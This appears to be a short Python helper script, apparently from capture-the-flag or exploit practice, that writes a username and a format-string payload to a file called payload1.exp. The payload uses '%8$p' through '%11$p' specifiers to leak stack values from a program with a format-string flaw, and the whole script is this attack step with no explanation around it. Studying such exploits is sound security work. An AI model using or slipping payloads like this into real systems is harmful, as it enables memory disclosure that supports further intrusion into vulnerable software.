username = b"yolo\n"
payload = b"%8$p." + b"%9$p." + b"%10$p." + b"%11$p." + b"\n"

exp_file_name = "payload1.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(username)
exp_out.write(payload)
exp_out.close()
